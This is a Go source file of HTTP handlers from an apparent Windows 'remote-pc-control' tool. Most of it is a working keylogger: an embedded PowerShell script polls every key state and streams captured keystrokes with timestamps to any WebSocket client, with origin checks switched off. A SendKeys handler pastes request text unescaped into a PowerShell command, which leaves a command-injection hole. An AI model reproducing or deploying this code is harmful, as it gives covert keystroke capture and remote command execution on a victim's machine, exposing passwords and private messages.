// +build windows

package handlers

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"remote-pc-control/models"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var (
	keylogRunning bool
	keylogMu      sync.Mutex
	keylogStop    chan struct{}
	upgrader      = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
)

func StartKeylogger(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	keylogMu.Lock()
	defer keylogMu.Unlock()

	if keylogRunning {
		json.NewEncoder(w).Encode(models.APIResponse{
			Success: false,
			Message: "keylogger already running",
		})
		return
	}

	keylogRunning = true
	keylogStop = make(chan struct{})

	json.NewEncoder(w).Encode(models.APIResponse{
		Success: true,
		Message: "keylogger started",
	})
}

func StopKeylogger(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	keylogMu.Lock()
	defer keylogMu.Unlock()

	if !keylogRunning {
		json.NewEncoder(w).Encode(models.APIResponse{
			Success: false,
			Message: "keylogger not running",
		})
		return
	}

	close(keylogStop)
	keylogRunning = false

	json.NewEncoder(w).Encode(models.APIResponse{
		Success: true,
		Message: "keylogger stopped",
	})
}

// KeyloggerWS streams captured keys via WebSocket
func KeyloggerWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	keylogMu.Lock()
	if !keylogRunning {
		keylogRunning = true
		keylogStop = make(chan struct{})
	}
	stopCh := keylogStop
	keylogMu.Unlock()

	// Use PowerShell to capture keystrokes
	psCmd := `
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyCapture {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

while ($true) {
    for ($i = 8; $i -le 255; $i++) {
        $state = [KeyCapture]::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            $key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i)
            if ($key) {
                Write-Output "$i|$key|$([DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds())"
            }
        }
    }
    Start-Sleep -Milliseconds 10
}
`

	cmd := exec.Command("powershell", "-Command",
		"Add-Type -AssemblyName System.Windows.Forms; "+psCmd)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return
	}

	if err := cmd.Start(); err != nil {
		return
	}

	go func() {
		<-stopCh
		cmd.Process.Kill()
	}()

	buf := make([]byte, 1024)
	for {
		select {
		case <-stopCh:
			return
		default:
			n, err := stdout.Read(buf)
			if err != nil {
				return
			}
			lines := strings.Split(strings.TrimSpace(string(buf[:n])), "\n")
			for _, line := range lines {
				parts := strings.SplitN(strings.TrimSpace(line), "|", 3)
				if len(parts) < 3 {
					continue
				}
				ts, _ := strconv.ParseInt(parts[2], 10, 64)
				entry := models.KeylogEntry{
					Key:       parts[1],
					Timestamp: ts,
				}

				msg, _ := json.Marshal(entry)
				if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
					return
				}
			}
		}
	}
}

func GetKeylogStatus(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	keylogMu.Lock()
	running := keylogRunning
	keylogMu.Unlock()

	json.NewEncoder(w).Encode(models.APIResponse{
		Success: true,
		Data: map[string]interface{}{
			"running":   running,
			"timestamp": time.Now().Unix(),
		},
	})
}

func SendKeys(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	var req struct {
		Keys string `json:"keys"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Keys == "" {
		json.NewEncoder(w).Encode(models.APIResponse{
			Success: false,
			Message: "keys parameter is required",
		})
		return
	}

	// Use PowerShell SendKeys
	psCmd := fmt.Sprintf(`
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait("%s")
`, req.Keys)

	cmd := exec.Command("powershell", "-Command", psCmd)
	output, err := cmd.CombinedOutput()
	if err != nil {
		json.NewEncoder(w).Encode(models.APIResponse{
			Success: false,
			Message: fmt.Sprintf("failed to send keys: %s", string(output)),
		})
		return
	}

	json.NewEncoder(w).Encode(models.APIResponse{
		Success: true,
		Message: "keys sent",
	})
}
